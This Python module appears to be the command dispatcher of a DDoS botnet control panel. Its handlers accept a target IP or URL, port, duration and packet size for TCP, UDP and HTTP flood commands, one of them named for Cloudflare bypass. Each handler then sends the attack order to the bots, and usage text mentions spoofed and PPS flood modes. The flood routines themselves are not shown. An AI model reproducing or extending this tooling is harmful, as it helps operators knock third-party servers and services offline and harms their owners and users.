from colorama import Fore
import random

def tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data):
    if len(args) == 6:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    if validate_size(size):
                        send(client, ansi_clear, False)
                        attack_sent2(ip, port, secs, size, client)
                        broadcast(data)
                    else:
                        send(client, Fore.RED + 'Invalid packet size (0-999999999999 bytes)')
                else:
                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .tup [IP] [PORT] [TIME] [SIZE] [TYPE_BYTES]')
        send(client, '[TYPE_BYTES] <-- URANDOM RANDBYTES')

def http_flooding_sent1(args, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 7:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_port(port):
            if validate_time(secs):
                send(client, ansi_clear, False)
                attack_sent1(ip, port, secs, client)
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
        else:
            send(client, Fore.RED + 'Invalid port number (1-65535)')
    else:
        send(client, f'Usage: .HTTP [IP/URL] [PORT] [TIME] [MODE_HEADER_SOCKET] [MODE_SENT] [VPH]')
        send(client, "[MODE_SENT] <-- PYF NULL SPOOF HTTP PPS")
        send(client, "[VPH] <-- VERSION PROTOCOL HTTP (0.9 1.0 1.1 2.0 3.0)")
        send(client, "# NOTE if you enter / end in url | botnet can't attack ")

def http_flooding_sent2(args, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 7:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_port(port):
            if validate_time(secs):
                send(client, ansi_clear, False)
                attack_sent1(ip, port, secs, client)
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
        else:
            send(client, Fore.RED + 'Invalid port number (1-65535)')
    else:
        send(client, f'Usage: .cfb_sock [IP/URL] [PORT] [TIME] [MODE_HEADER_SOCKET] [MODE_SENT] [VPH]')
        send(client, "[MODE_SENT] <-- PYF NULL SPOOF HTTP PPS")
        send(client, "[VPH] <-- VERSION PROTOCOL HTTP (0.9 1.0 1.1 2.0 3.0)")
        send(client, "# NOTE if you enter / end in url | botnet can't attack ")

def all_sent1(args,mode, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    send(client, ansi_clear, False)
                    attack_sent1(ip, port, secs, client)
                    broadcast(data)
                else:
                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        mode_type = mode.split('.')
        mode_type = mode_type[1].lower()
        send(client, f'Usage: .{mode_type} [IP] [PORT] [TIME]')

def tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data):
    if len(args) == 6:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    if validate_size(size):
                        send(client, ansi_clear, False)
                        attack_sent2(ip, port, secs, size, client)
                        broadcast(data)
                    else:
                        send(client, Fore.RED + 'Invalid packet size (0-999999999999 bytes)')
                else:
                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .tcp [IP] [PORT] [TIME] [SIZE] [TYPE_BYTES]')
        send(client, '[TYPE_BYTES] <-- URANDOM RANDBYTES')

def udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data):
    if len(args) == 6:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    if validate_size(size):
                        send(client, ansi_clear, False)
                        attack_sent2(ip, port, secs, size, client)
                        broadcast(data)
                    else:
                        send(client, Fore.RED + 'Invalid packet size (0-999999999999 bytes)')
                else:
                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .udp [IP] [PORT] [TIME] [SIZE] [TYPE_BYTES]')
        send(client, '[TYPE_BYTES] <-- URANDOM RANDBYTES')
def http_req(args, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        method = args[2]
        secs = args[3]
        if validate_time(secs):
            send(client, ansi_clear, False)
            attack_sent1(ip,"80/443", secs, client)
            broadcast(data)
        else:
            send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
    else:
        send(client, 'Usage: .http_req [URL] [HTTP_METHODS] [TIME]')
        send(client, '[HTTP_METHODS] <-- get post head delete options patch put all')

def http_req2(args, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 3:
        ip = args[1]
        secs = args[2]
        if validate_time(secs):
            send(client, ansi_clear, False)
            attack_sent1(ip,"80/443", secs, client)
            broadcast(data)
        else:
            send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
    else:
        send(client, 'Usage: .http_dfb [URL] [TIME]')

def http_cfb(args, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        method = args[2]
        secs = args[3]
        if validate_time(secs):
            send(client, ansi_clear, False)
            attack_sent1(ip,"80/443", secs, client)
            broadcast(data)
        else:
            send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
    else:
        send(client, 'Usage: .http_cfb [URL] [HTTP_METHODS] [TIME]')
        send(client, '[HTTP_METHODS] <-- get post head delete options patch put all')

def http_all(args, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        method = args[2]
        secs = args[3]
        if validate_time(secs):
            send(client, ansi_clear, False)
            attack_sent1(ip,"80/443", secs, client)
            broadcast(data)
        else:
            send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
    else:
        send(client, 'Usage: .http_all [URL] [HTTP_METHODS] [TIME]')
        send(client, '[HTTP_METHODS] <-- get post head delete options patch put all')
